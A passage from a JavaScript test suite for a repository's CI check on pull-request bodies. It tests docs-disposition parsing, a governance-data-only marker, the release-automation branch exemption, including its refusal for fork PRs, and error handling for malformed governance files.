    const values = statedValues(workflowFile, 'branch');
    assert.equal(
      values.length,
      1,
      `${workflowFile} must state exactly one \`branch:\` key — the automation PR head ` +
        `branch (found ${values.length})`,
    );
    return values[0];
  };

  const before = {
    'README.md': '| Chrome Extension | 3.0.0 |\n',
    'schemas/extension.delta.json': '{\n  "version": "3.0.0"\n}\n',
    'schemas/dist/extension.schema.json': '{\n  "x": 1\n}\n',
    // Governance data the non-exempt path reads; unchanged between the two
    // commits, so it never enters the diff under test. The map is shape-valid —
    // the check compiles it before resolving scope — and its one area owns a
    // tree none of these files sit in, so the scope stays the edited repo-wide
    // README line alone.
    [MAP_PATH]: JSON.stringify({
      description: 'fixture map',
      'repo-wide': { description: 'x', docs: ['README.md'] },
      areas: { unrelated: { code: ['packages/unrelated/**'], docs: ['docs/unrelated.md'] } },
      unassigned: [],
      'declared-governance': [],
      'governance-partitions': [],
    }),
    [REGISTRY_PATH]: JSON.stringify({
      description: 'fixture registry',
      prefixes: {},
      retired: {},
      clauses: [],
    }),
  };
  const after = {
    'README.md': '| Chrome Extension | 3.1.0 |\n',
    'schemas/extension.delta.json': '{\n  "version": "3.1.0"\n}\n',
    'schemas/dist/extension.schema.json': '{\n  "x": 2\n}\n',
  };

  /**
   * A pull request on this repository, as Actions presents it to the check.
   * The repository names are fixtures: the derivation compares them for equality,
   * so what they spell never matters, only whether they agree.
   */
  const SAME_REPO_CI = {
    GITHUB_ACTIONS: 'true',
    GITHUB_REPOSITORY: 'owner/repo',
    PR_HEAD_REPO: 'owner/repo',
  };

  it('exits 0 on a release-output-only diff carried by the automation head ref', () => {
    const r = runCheckOnChange(before, after, {
      ...SAME_REPO_CI,
      PR_BODY: generatedBody(),
      PR_HEAD_REF: AUTOMATED_BRANCH,
    });
    assert.equal(
      r.status,
      0,
      `expected the release-automation diff to be admitted (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /release-automation/);
  });

  it('exits 1 on the same diff without the head ref — the class is never decided from the diff alone', () => {
    const r = runCheckOnChange(before, after, {
      ...SAME_REPO_CI,
      PR_BODY: generatedBody(),
      PR_HEAD_REF: '',
    });
    assert.equal(
      r.status,
      1,
      `expected the same diff to owe the sections without the head ref, got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    // The red is the disposition verdict itself, not a crash on the way to it.
    assert.match(r.stderr, /missing PR-body section\(s\)/);
  });

  it('exits 1 when that branch name arrives on a pull request opened from another repository', () => {
    // Everything the diff can show is right: a self-consistent regeneration of
    // the release outputs, on a branch named exactly like the pipeline's. The
    // one thing that differs is where the branch lives, and that is what the
    // class turns on — so this PR owes the sections like any other.
    const r = runCheckOnChange(before, after, {
      ...SAME_REPO_CI,
      PR_HEAD_REPO: 'somewhere-else/repo',
      PR_BODY: generatedBody(),
      PR_HEAD_REF: AUTOMATED_BRANCH,
    });
    assert.equal(
      r.status,
      1,
      `expected a head repository other than this one to owe the sections, got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, /missing PR-body section\(s\)/);
  });

  it('exits 1 under CI that carries no head repository — the derivation fails closed', () => {
    const r = runCheckOnChange(before, after, {
      ...SAME_REPO_CI,
      PR_HEAD_REPO: '',
      PR_BODY: generatedBody(),
      PR_HEAD_REF: AUTOMATED_BRANCH,
    });
    assert.equal(
      r.status,
      1,
      `expected a missing head repository to owe the sections, got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, /missing PR-body section\(s\)/);
  });

  it('admits the class off CI on the supplied head ref alone — the documented local run', () => {
    // Off CI there is no event to derive anything from: the head ref is what
    // the person running the check typed, which is how the local recipes in
    // docs/guides/local-ci.md exercise this class.
    const r = runCheckOnChange(before, after, {
      GITHUB_ACTIONS: '',
      PR_BODY: generatedBody(),
      PR_HEAD_REF: AUTOMATED_BRANCH,
    });
    assert.equal(
      r.status,
      0,
      `expected the documented local run to admit the class (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /release-automation/);
  });

  it('both publish workflows generate the same automation PR body', () => {
    // One branch, one PR body: whichever pipeline opens the version PR, the
    // body a reader finds there says the same thing about why it carries no
    // sections. Byte equality, so a sentence added to one and not the other
    // reds here rather than shipping as a per-platform difference.
    assert.equal(generatedBody('.github/workflows/publish-desktop.yml'), generatedBody());
  });

  it('both publish workflows open the automation PR on the branch the guards key on', () => {
    // The head ref is what selects the release-output guard's positive mode and
    // what admits the version PR without the disposition sections. A rename in
    // either workflow — or in the constant — routes the release PR down the
    // feature-branch paths instead, red at release time on the one PR no human
    // is watching. Pinning both workflows to the constant reds that rename here
    // instead, at the keystroke. The prose side of the same rename — the
    // documents that spell the branch out for a reader — is welded in that
    // constant's own suite ('the automation branch name — welded to the prose
    // that spells it out', in
    // packages/shared/tests/unit/check-no-release-outputs.test.js).
    assert.equal(declaredBranch(), AUTOMATED_BRANCH);
    assert.equal(declaredBranch('.github/workflows/publish-desktop.yml'), AUTOMATED_BRANCH);
  });
});

describe('docsInScope', () => {
  it('collects the resolved areas doc sets for changed code', () => {
    assert.deepEqual(
      docsInScope({ files: ['packages/alpha/x.js'], map: MAP, readFile: noContent }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });

  it('includes an edited repo-wide doc that belongs to no doc set', () => {
    assert.deepEqual(docsInScope({ files: ['README.md'], map: MAP, readFile: noContent }), [
      'README.md',
    ]);
  });

  it('routes a repo-wide doc that sits in a doc set through its areas (no self-duplication)', () => {
    assert.deepEqual(docsInScope({ files: ['docs/hub.md'], map: MAP, readFile: noContent }), [
      'docs/alpha.md',
      'docs/hub.md',
    ]);
  });

  it('resolves via a pointer comment when file content names a governing doc', () => {
    assert.deepEqual(
      docsInScope({ files: ['tools/free.rs'], map: MAP, readFile: () => '// see docs/alpha.md' }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });

  it('a declared-governance file resolves to its governed-by, overriding its area docs', () => {
    // scripts/gen.js is code-owned by tooling (→ docs/tooling.md) but declared governed by docs/alpha.md.
    const map = {
      ...MAP,
      'declared-governance': [
        { path: 'scripts/gen.js', reason: 'x', 'governed-by': ['docs/alpha.md'] },
      ],
    };
    assert.deepEqual(docsInScope({ files: ['scripts/gen.js'], map, readFile: noContent }), [
      'docs/alpha.md',
    ]);
  });

  it('a declared-governance file with governed-by [] contributes no docs', () => {
    const map = {
      ...MAP,
      'declared-governance': [{ path: 'scripts/data.json', reason: 'x', 'governed-by': [] }],
    };
    assert.deepEqual(docsInScope({ files: ['scripts/data.json'], map, readFile: noContent }), []);
  });
});

describe('expectedDispositionLines', () => {
  it('emits one doc-level line plus one per judgment-only clause', () => {
    assert.deepEqual(
      expectedDispositionLines({ docs: ['docs/alpha.md', 'docs/tooling.md'], registry: REGISTRY }),
      [
        { doc: 'docs/alpha.md', clause: null },
        { doc: 'docs/alpha.md', clause: 'AL-1' },
        { doc: 'docs/alpha.md', clause: 'AL-3' },
        { doc: 'docs/tooling.md', clause: null },
      ],
    );
  });
});

describe('stripHtmlComments', () => {
  it('removes single-line, multi-line, and unterminated comments', () => {
    const text = 'keep\n<!-- gone -->\n<!-- multi\nline\ngone -->\nkeep2\n<!-- open forever\ngone';
    assert.equal(stripHtmlComments(text), 'keep\n\n\nkeep2\n');
  });
});

describe('parseDispositionSection', () => {
  it('parses verbs, docs, clause anchors, and text — markdown prefixes tolerated', () => {
    const { lines, malformed } = parseDispositionSection(
      [
        'unaffected: docs/alpha.md — nothing here changes capture',
        '- updated: docs/tooling.md — documented the new check',
        '1. unaffected: docs/alpha.md §AL-1 — comment-only change',
        '> unaffected: docs/alpha.md §AL-3 — quoted but real',
        '**updated:** docs/hub.md — bold verb normalized',
        'unaffected: `docs/beta.md` — backticks stripped',
        'Some prose the author left in.',
      ].join('\n'),
    );
    assert.equal(malformed.length, 0);
    assert.deepEqual(
      lines.map((l) => [l.verb, l.doc, l.clause]),
      [
        ['unaffected', 'docs/alpha.md', null],
        ['updated', 'docs/tooling.md', null],
        ['unaffected', 'docs/alpha.md', 'AL-1'],
        ['unaffected', 'docs/alpha.md', 'AL-3'],
        ['updated', 'docs/hub.md', null],
        ['unaffected', 'docs/beta.md', null],
      ],
    );
  });

  it('collects lines that try to be dispositions but do not parse', () => {
    const { lines, malformed } = parseDispositionSection('updated docs/alpha.md missing colon\n');
    assert.deepEqual(lines, []);
    assert.deepEqual(malformed, ['updated docs/alpha.md missing colon']);
  });
});

describe('isGovernanceDataDiff — the class the single recorded line belongs to', () => {
  it('admits the area map alone and the map with the clause registry', () => {
    assert.equal(isGovernanceDataDiff([MAP_PATH]), true);
    assert.equal(isGovernanceDataDiff([MAP_PATH, REGISTRY_PATH]), true);
  });

  it('leaves a registry-only diff outside — its per-doc wall is empty, so there is nothing to replace', () => {
    assert.equal(isGovernanceDataDiff([REGISTRY_PATH]), false);
  });

  it('rejects a diff that carries anything else, and an empty file list', () => {
    assert.equal(isGovernanceDataDiff([MAP_PATH, 'scripts/check-area-map.js']), false);
    assert.equal(isGovernanceDataDiff([]), false);
  });
});

describe('parseGovernanceSection', () => {
  it('reads the marker line, markdown prefixes and a bold verb tolerated', () => {
    const { reasons, malformed } = parseGovernanceSection(
      [
        `- ${GOVERNANCE_MARKER} the map still resolves every tracked file`,
        '**governance-data-only:** a second one, bold',
        'Some prose the author left in.',
      ].join('\n'),
    );
    assert.deepEqual(reasons, ['the map still resolves every tracked file', 'a second one, bold']);
    assert.deepEqual(malformed, []);
  });

  it('reports a near-miss spelling or an empty reason as an attempt, not as prose', () => {
    const { reasons, malformed } = parseGovernanceSection(
      ['governance-data: reason', 'Governance-data-only: capitalised', GOVERNANCE_MARKER].join(
        '\n',
      ),
    );
    assert.deepEqual(reasons, []);
    assert.equal(malformed.length, 3);
  });

  it('tolerates prose that opens with the word "Governance" — it is not an attempt', () => {
    // The attempt matcher is anchored on the hyphenated stem precisely so a
    // disposition section may say this in prose without reddening the PR.
    const { reasons, malformed } = parseGovernanceSection(
      [
        'Governance data is untouched by this change.',
        'Governance of the area map is unchanged.',
      ].join('\n'),
    );
    assert.deepEqual(reasons, []);
    assert.deepEqual(malformed, []);
  });
});

describe('auditBody — the governance-data-only record', () => {
  const record = [
    '',
    '## Change record',
    '',
    'Intent: test.',
    'Outside knowledge: none.',
    MUTATION_LINE,
  ].join('\n');
  const withDisposition = (lines) => ['## Docs disposition', '', ...lines, record].join('\n');
  const goodLine = `${GOVERNANCE_MARKER} the map still names a governing doc set for every file it moved`;

  it('passes a qualifying diff carrying exactly the one line', () => {
    const r = auditBody({
      body: withDisposition([goodLine]),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(Object.values(r).flat(), []);
  });

  it('reds a qualifying diff whose section omits the line — and teaches it', () => {
    const r = auditBody({ body: withDisposition(['']), expected: [], governanceData: true });
    assert.deepEqual(r.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
  });

  it('reds a qualifying diff that writes the per-doc wall instead', () => {
    const r = auditBody({
      body: withDisposition(['unaffected: docs/guides/ci.md — no gate changed']),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(r.unexpected, ['docs/guides/ci.md']);
    assert.deepEqual(r.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
  });

  it('reds more than one line — the section carries exactly one', () => {
    const r = auditBody({
      body: withDisposition([goodLine, `${GOVERNANCE_MARKER} and another reason`]),
      expected: [],
      governanceData: true,
    });
    assert.equal(r.governanceProblems.length, 1);
    assert.match(r.governanceProblems[0], /exactly one/);
  });

  it('reds the line as unearned on a diff outside the class — a registry-only diff included', () => {
    // A registry-only diff keeps the sections exactly as before this class
    // existed: an empty per-doc wall, and the marker line unearned.
    const r = auditBody({ body: withDisposition([goodLine]), expected: [] });
    assert.equal(r.governanceProblems.length, 1);
    assert.match(r.governanceProblems[0], /outside the governance-data-only class/);
    // And with a wall of its own, the per-doc lines are still what is owed.
    const withWall = auditBody({
      body: withDisposition([goodLine]),
      expected: [{ doc: 'docs/guides/ci.md', clause: null }],
    });
    assert.deepEqual(withWall.missing, ['docs/guides/ci.md']);
    assert.equal(withWall.governanceProblems.length, 1);
  });

  it('passes a registry-only diff carrying neither per-doc lines nor the marker', () => {
    // The green half of the case above: the area map declares the registry
    // governed by no doc, so a registry-only diff owes no per-doc lines — and
    // being outside the class, it owes no marker either. Its section is empty
    // and both required sections are present, which is a pass.
    const realMap = JSON.parse(repoFile(MAP_PATH));
    assert.equal(isGovernanceDataDiff([REGISTRY_PATH]), false);
    assert.deepEqual(
      docsInScope({ files: [REGISTRY_PATH], map: realMap, readFile: noContent }),
      [],
    );
    const r = auditBody({ body: withDisposition(['']), expected: [] });
    assert.deepEqual(Object.values(r).flat(), []);
  });

  it('reds an empty reason and a near-miss spelling as malformed', () => {
    const empty = auditBody({
      body: withDisposition([GOVERNANCE_MARKER]),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(empty.malformed, [GOVERNANCE_MARKER]);
    assert.deepEqual(empty.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
    const nearMiss = auditBody({
      body: withDisposition(['governance-data-only the map still resolves everything']),
      expected: [],
      governanceData: true,
    });
    assert.equal(nearMiss.malformed.length, 1);
  });

  it('still requires the change record, and the section itself', () => {
    const noRecord = auditBody({
      body: ['## Docs disposition', '', goodLine].join('\n'),
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(noRecord.missingSections, ['## Change record']);
    const noSections = auditBody({
      body: 'just a description',
      expected: [],
      governanceData: true,
    });
    assert.deepEqual(noSections.missingSections, ['## Docs disposition', '## Change record']);
    assert.deepEqual(noSections.governanceProblems, [`no "${GOVERNANCE_MARKER}" line`]);
  });
});

describe('run() governance-data-only class — the recorded line end to end', () => {
  // Shape-valid (the check compiles the map before resolving scope), with one
  // area owning a tree none of these files sit in — so the scope the non-class
  // case computes stays the edited repo-wide README line alone.
  const fixtureMap = (description) =>
    JSON.stringify({
      description,
      'repo-wide': { description: 'x', docs: ['README.md'] },
      areas: { unrelated: { code: ['packages/unrelated/**'], docs: ['docs/unrelated.md'] } },
      unassigned: [],
      'declared-governance': [],
      'governance-partitions': [],
    });

  const REGISTRY_FIXTURE = JSON.stringify({
    description: 'fixture registry',
    prefixes: {},
    retired: {},
    clauses: [],
  });

  const before = {
    'README.md': 'a repo-wide doc\n',
    [MAP_PATH]: fixtureMap('fixture map'),
    [REGISTRY_PATH]: REGISTRY_FIXTURE,
  };

  const body = (dispositionLines) =>
    [
      '## Docs disposition',
      '',
      ...dispositionLines,
      '',
      '## Change record',
      '',
      'Intent: test.',
      'Outside knowledge: none.',
      MUTATION_LINE,
    ].join('\n');

  const markerLine = `${GOVERNANCE_MARKER} every tracked file still resolves to a governing doc set`;

  it('exits 0 on a map-only diff carrying the single marker line, naming the class', () => {
    const r = runCheckOnChange(
      before,
      { [MAP_PATH]: fixtureMap('fixture map, edited') },
      { PR_BODY: body([markerLine]) },
    );
    assert.equal(
      r.status,
      0,
      `expected the map-only diff to pass on the marker line (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /governance-data-only/);
  });

  it('exits 1 when the marker line rides a diff outside the class', () => {
    const r = runCheckOnChange(
      before,
      { 'README.md': 'an edited repo-wide doc\n' },
      { PR_BODY: body([markerLine]) },
    );
    assert.equal(
      r.status,
      1,
      `expected the unearned marker line to red (exit 1), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, /outside the governance-data-only class/);
  });
});

describe('run() on governance data it cannot use — the red is the refusal, on each loader’s own exit code', () => {
  // The check reads both governance-data files to derive scope, so either one it
  // cannot use is breakage on its own input, and the red is the verdict itself
  // rather than a crash on the way to it — the same posture the class tests above
  // pin. What that verdict says differs by file and by what was found: the map's
  // shape errors are enumerated as found where the map read but its shape failed,
  // while text that does not read as JSON states one reason in their place; the
  // registry answers with the single-sentence verdict its own check states,
  // whether its text is not JSON or it could not be read at all.
  const REGISTRY_FIXTURE = JSON.stringify({
    description: 'fixture registry',
    prefixes: {},
    retired: {},
    clauses: [],
  });

  /** A body that satisfies every format rule, so only the input refusal reds. */
  const BODY = [
    '## Docs disposition',
    '',
    'unaffected: README.md — nothing here touches it',
    '',
    '## Change record',
    '',
    'Intent: test.',
    'Outside knowledge: none.',
    MUTATION_LINE,
  ].join('\n');

  /** Shape-invalid: `areas` is empty, and the partitions are a bare-string list. */
  const malformedMap = JSON.stringify({
    description: 'fixture map',
    'repo-wide': { description: 'x', docs: ['README.md'] },
    areas: {},
    unassigned: [],
    'declared-governance': [],
    'governance-partitions': ['packages/alpha/**'],
  });

  it('exits non-zero naming the map and its shape errors, with no stack trace', () => {
    const r = runCheckOnChange(
      {
        'README.md': 'a repo-wide doc\n',
        [MAP_PATH]: malformedMap,
        [REGISTRY_PATH]: REGISTRY_FIXTURE,
      },
      { 'README.md': 'an edited repo-wide doc\n' },
      {
        PR_BODY: [
          '## Docs disposition',
          '',
          'unaffected: README.md — nothing here touches it',
          '',
          '## Change record',
          '',
          'Intent: test.',
          'Outside knowledge: none.',
          MUTATION_LINE,
        ].join('\n'),
      },
    );
    assert.equal(
      r.status,
      1,
      `expected the malformed map to red (exit 1), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, new RegExp(`${MAP_PATH.replace('.', '\\.')} is malformed`));
    assert.match(r.stderr, /"areas" must be a non-empty object/);
    assert.doesNotMatch(r.stderr, /^\s+at /m); // a verdict, not a thrown stack
  });

  it('answers a map that does not read as JSON with that same refusal', () => {
    // The step before the shape check is the read itself, and it answers alike:
    // the surface is named, the parser's reason is stated, and what reaches the
    // contributor is a verdict rather than the parser's stack.
    const r = runCheckOnChange(
      {
        'README.md': 'a repo-wide doc\n',
        [MAP_PATH]: '{ "description": "fixture map",',
        [REGISTRY_PATH]: REGISTRY_FIXTURE,
      },
      { 'README.md': 'an edited repo-wide doc\n' },
      { PR_BODY: BODY },
    );
    assert.equal(
      r.status,
      1,
      `expected the unparseable map to red (exit 1), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, new RegExp(`${MAP_PATH.replace('.', '\\.')} is malformed`));
    assert.match(r.stderr, /does not read as JSON/);
    assert.doesNotMatch(r.stderr, /^\s+at /m);
  });

  it('answers a registry that does not read as JSON with the registry check\u2019s refusal', () => {
    const r = runCheckOnChange(
      {
        'README.md': 'a repo-wide doc\n',
        [MAP_PATH]: JSON.stringify({
          description: 'fixture map',
          'repo-wide': { description: 'x', docs: ['README.md'] },
          areas: { alpha: { code: ['packages/alpha/**'], docs: ['docs/alpha.md'] } },
          unassigned: [],
          'declared-governance': [],
          'governance-partitions': [],
        }),
        'docs/alpha.md': 'alpha doctrine\n',
        [REGISTRY_PATH]: '{ "clauses": [',
      },
      { 'README.md': 'an edited repo-wide doc\n' },
      { PR_BODY: BODY },
    );
    assert.equal(
      r.status,
      2,
      `expected the unparseable registry to refuse on the machinery exit code (exit 2), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(
      r.stderr,
      new RegExp(`${REGISTRY_PATH.replace('.', '\\.')} does not read as JSON`),
    );
    assert.doesNotMatch(r.stderr, /^\s+at /m);
  });

  it('answers a registry it cannot read at all with that same refusal', () => {
    // The other branch of the same read: the registry is simply not in the tree,
    // so the read itself fails. The check answers with the registry check's own
    // verdict, saying which of the two it was, and still prints no stack.
    const r = runCheckOnChange(
      {
        'README.md': 'a repo-wide doc\n',
        [MAP_PATH]: JSON.stringify({
          description: 'fixture map',
          'repo-wide': { description: 'x', docs: ['README.md'] },
          areas: { alpha: { code: ['packages/alpha/**'], docs: ['docs/alpha.md'] } },
          unassigned: [],
          'declared-governance': [],
          'governance-partitions': [],
        }),
        'docs/alpha.md': 'alpha doctrine\n',
      },
      { 'README.md': 'an edited repo-wide doc\n' },
      { PR_BODY: BODY },
    );
    assert.equal(
      r.status,
      2,
      `expected the unreadable registry to refuse on the machinery exit code (exit 2), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stderr, new RegExp(`${REGISTRY_PATH.replace('.', '\\.')} could not be read`));
    assert.doesNotMatch(r.stderr, /does not read as JSON/);
    assert.doesNotMatch(r.stderr, /^\s+at /m);
  });
});

describe('extractSection', () => {
  const body = '# T\n\n## Docs disposition\n\nline1\n\n## Change record\n\nIntent: x\n';

  it('extracts a section up to the next heading, case-insensitively', () => {
    assert.match(extractSection(body, 'Docs disposition'), /line1/);
    assert.doesNotMatch(extractSection(body, 'docs disposition'), /Intent:/);
    assert.match(extractSection(body, 'Change record'), /Intent: x/);
  });

  it('returns null for an absent section', () => {
    assert.equal(extractSection(body, 'Motivation'), null);
  });

  it('a fenced ## line does not end the section — a heading inside a fence is not a heading', () => {
    // Contributors paste examples into a PR body. Before the fence model, the
    // `## ` inside one cut the section short and the check blamed the author for
    // the lines it had dropped.
    const fenced = [
      '## Docs disposition',
      '',
      '```text',
      '## Change record',
      '```',
      '',
      'unaffected: docs/alpha.md — no capture change',
      '',
      '## Change record',
      '',
      'Intent: x',
    ].join('\n');
    const section = extractSection(fenced, 'Docs disposition');
    assert.match(section, /unaffected: docs\/alpha\.md/);
    assert.doesNotMatch(section, /Intent:/);
  });

  it('a fence left open runs to the end of the body, so a heading below it is inside it', () => {
    // Under the one fence model an unclosed fence is a code block to the end of
    // the text, and the verdict says so rather than asking for a heading the
    // author can see a few lines down.
    const open = [
      '## Docs disposition',
      '',
      '```text',
      'an example left open',
      '',
      '## Change record',
      '',
      'Intent: x',
    ].join('\n');
    assert.equal(extractSection(open, 'Change record'), null);
    assert.deepEqual(auditBody({ body: open, expected: [] }).missingSections, [
      CHANGE_RECORD_HEADING,
    ]);
  });

  it("a section's own fenced lines come back in it", () => {
    // The boundaries are read off the defenced view; the body is sliced from the
    // raw text, so what the author fenced is still there to be read.
    const fenced = [
      '## Docs disposition',
      '',
      '```text',
      'unaffected: docs/alpha.md — pasted inside a fence',
      '```',
      '',
      '## Change record',
      '',
      'Intent: x',
    ].join('\n');
    assert.match(
      extractSection(fenced, 'Docs disposition'),
      /unaffected: docs\/alpha\.md — pasted inside a fence/,
    );
  });

  it('keeps a disposition line written directly under the heading', () => {
    // The line under the heading is a line of the section: a body that skips
    // the blank line still has its first disposition line read.
    const tight = [
      '## Docs disposition',
      'unaffected: docs/alpha.md — no capture change',
      '',
      '## Change record',
      '',
      'Intent: x',
    ].join('\n');
    const section = extractSection(tight, 'Docs disposition');
    assert.equal(section.split('\n')[0], 'unaffected: docs/alpha.md — no capture change');
  });

  it('does not read a bare `## ` marker with its title on the next line as the heading', () => {
    // A heading is one line: a marker whose title sits on the line below it
    // states no section, and the body carries none by that title.
    const split = ['## ', 'Docs disposition', 'unaffected: docs/alpha.md — no capture change'].join(
      '\n',
    );
    assert.equal(extractSection(split, 'Docs disposition'), null);
  });
});

describe('auditBody', () => {
  const expected = [
    { doc: 'docs/alpha.md', clause: null },
    { doc: 'docs/alpha.md', clause: 'AL-1' },
  ];
  const goodBody = [
    '## Docs disposition',
    '',
    'unaffected: docs/alpha.md — no capture change',
    'unaffected: docs/alpha.md §AL-1 — comment-only',
    '',
    '## Change record',
    '',
    'Intent: test.',
    'Outside knowledge: none.',
    MUTATION_LINE,
  ].join('\n');

  it('passes a complete body — also with CRLF line endings', () => {
    assert.deepEqual(Object.values(auditBody({ body: goodBody, expected })).flat(), []);
    const crlf = goodBody.replace(/\n/g, '\r\n');
    assert.deepEqual(Object.values(auditBody({ body: crlf, expected })).flat(), []);
  });

  it('counts the expected lines a body fenced — a fence is formatting, not absence', () => {
    const fencedBody = [
      '## Docs disposition',
      '',
      '```text',
      'unaffected: docs/alpha.md — no capture change',
      'unaffected: docs/alpha.md §AL-1 — comment-only',
      '```',
      '',
      '## Change record',
      '',
      'Intent: test.',
      'Outside knowledge: none.',
      MUTATION_LINE,
    ].join('\n');
    assert.deepEqual(Object.values(auditBody({ body: fencedBody, expected })).flat(), []);
  });

  it('reports a missing expected line by its exact anchor', () => {
    const r = auditBody({
      body: goodBody.replace(/unaffected: docs\/alpha\.md §AL-1.*\n/, ''),
      expected,
    });
    assert.deepEqual(r.missing, ['docs/alpha.md §AL-1']);
  });

  it('reports out-of-scope and duplicate lines', () => {
    const noisy = goodBody.replace(
      '## Change record',
      'updated: docs/other.md — not in scope\nunaffected: docs/alpha.md — again\n\n## Change record',
    );
    const r = auditBody({ body: noisy, expected });
    assert.deepEqual(r.unexpected, ['docs/other.md']);
    assert.deepEqual(r.duplicates, ['docs/alpha.md']);
  });

  it('reports both sections when the body has neither', () => {
    const r = auditBody({ body: 'just a description', expected });
    assert.deepEqual(r.missingSections, ['## Docs disposition', '## Change record']);
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
  });

  it('reports missing change-record markers', () => {
    const r = auditBody({
      body: goodBody.replace('Outside knowledge: none.\n', '').replace(/mutation:.*\n?/, ''),
      expected,
    });
    assert.deepEqual(r.changeRecordProblems, [
      'change record has no "Outside knowledge:" line',
      'change record has no "mutation:" line',
    ]);
  });

  it('ignores disposition lines and markers hidden inside HTML comments — both directions', () => {
    // A clause line present only inside a comment must NOT count as present…
    const hidden = goodBody.replace(
      'unaffected: docs/alpha.md §AL-1 — comment-only',
      '<!-- unaffected: docs/alpha.md §AL-1 — invisible in the rendered PR -->',
    );
    assert.deepEqual(auditBody({ body: hidden, expected }).missing, ['docs/alpha.md §AL-1']);

    // …and markers that exist only in the template's comment must not satisfy.
    const emptyRecord = goodBody.replace(
      /Intent: test\.[\s\S]*$/,
      '<!-- Intent: <one sentence>\n Outside knowledge: <or "none">\n mutation: say so. -->\n',
    );
    const r = auditBody({ body: emptyRecord, expected });
    assert.equal(r.changeRecordProblems.length, 3);
  });

  it('requires markers at a line start — a marker quoted mid-prose does not satisfy', () => {
    const midProse = goodBody.replace(
      'Intent: test.',
      'This paragraph mentions the word Intent: casually.',
    );
    const r = auditBody({ body: midProse, expected });
    assert.deepEqual(r.changeRecordProblems, ['change record has no "Intent:" line']);
  });

  it('rejects the shipped PR template as-is (comments are inert, sections are empty)', () => {
    const template = repoFile('.github/PULL_REQUEST_TEMPLATE.md');
    const r = auditBody({ body: template, expected });
    assert.deepEqual(r.unexpected, []); // nothing inside comments leaks in
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
    assert.equal(r.changeRecordProblems.length, 3);
  });
});
